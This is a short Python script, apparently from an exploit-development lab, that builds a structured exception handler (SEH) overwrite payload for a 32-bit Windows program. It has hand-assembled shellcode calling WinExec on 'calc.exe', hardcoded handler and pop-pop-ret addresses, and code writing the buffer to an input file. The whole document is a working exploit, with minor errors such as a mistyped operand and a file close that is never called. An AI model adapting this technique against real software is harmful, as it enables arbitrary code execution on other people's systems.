shellcode = (
"\x8b\xec" # mov ebp, esp
"\x31\xc0" # xor eax, eax
"\xc6\xc0\x1f" # mov al, 0x1f
"\x40" # inc eax
"\x50" # push eax
"\x68\x2e\x65\x78\x65" # push 0x6578652e
"\x68\x63\x61\x6c\x63" # push 0x636c6163
"\x8d\x45\xf4" # lea eax, [ebp=0xc]
"\x33\xdb" # xor ebx, ebx
"\x43\x43\x43\x43\x43" # inc ebx (5 times)
"\x53" # push ebx
"\x50" # push eax
"\xb8\x80\xd3\x7e\x75" # mov eax, WinExec
"\xff\xd0" # call eax
)

# Buffer address: 0019FEE4
# Handler address: 0019FF10
# [pop, pop, ret] address: 0140224B
# WinExec address: 757ED380

payload = 'A'* (0x19FF10 - 0x19FEE4)
payload += "\xeb\x06aa" # Pointer to next SEH record -> Jump 6 bits to shellcode
payload += "\x4b\x22\x40\x01" # SE Handler address -> Back to SEH record pointer
payload += shellcode

f = open("C:\\Users\\IEUser\\Desktop\\input.txt", "w")
f.write(payload)
f.close